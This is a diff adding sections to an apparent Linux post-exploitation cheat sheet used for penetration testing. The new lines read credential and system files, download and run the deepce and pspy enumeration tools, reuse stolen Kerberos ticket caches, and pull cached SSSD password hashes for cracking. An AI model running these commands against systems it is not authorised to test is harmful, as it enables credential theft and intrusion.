@@ -37,6 +37,18 @@ last -n 5                         # shows the login history of last 5 users.
 cat /etc/passwd | grep -i 'sh$'   # list users
 ```
 
+# Quick files to Check
+```bash
+ls -la /etc/systemd/system
+cat /etc/resolv.conf
+/usr/bin/env   or  /usr/bin/printenv
+cat /etc/*-release
+cat /etc/passwd
+cat /etc/sudoers
+/usr/bin/w or w  # show Current logins
+last -n 5         # show last 5 logins
+```
+
 
 # Processes & Runtime
 ```bash
@@ -168,6 +180,20 @@ grep -ri --include="*.xml" -n "Password" /opt 2>/dev/null
 ```bash
 ./linpeas.sh
 ```
+
+> Pspy [pspy](https://github.com/DominicBreuker/pspy/releases)
+```bash
+chmod +x pspy64
+./pspy64
+```
+
+> Deepce  [Deepce](https://github.com/stealthcopter/deepce)
+
+```bash
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
+chmod +x deepce.sh
+./deepce.sh
+```
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Credential Access
 
@@ -203,6 +229,20 @@ grep -ri --include="*.xml" -n "Password" /opt 2>/dev/null
 
 
 # Active Directory Files
+```bash
+# Kerberos ticket cache
+ls /tmp/krb5cc_*
+# Read ticket
+klist -c /tmp/krb5cc_1000
+
+cp /tmp/krb5cc_1000 /tmp/found.ccache
+export KRB5CCNAME="/tmp/found.ccache"
+
+# SSSD cached credentials
+ls /var/lib/sss/db/
+# Contains cached password hashes
+python3 sssd2hashcat.py /var/lib/sss/db/cache_corp.local.ldb
+```
 ```bash
 ===================================================================================
 Active Directory:- keytab , config 
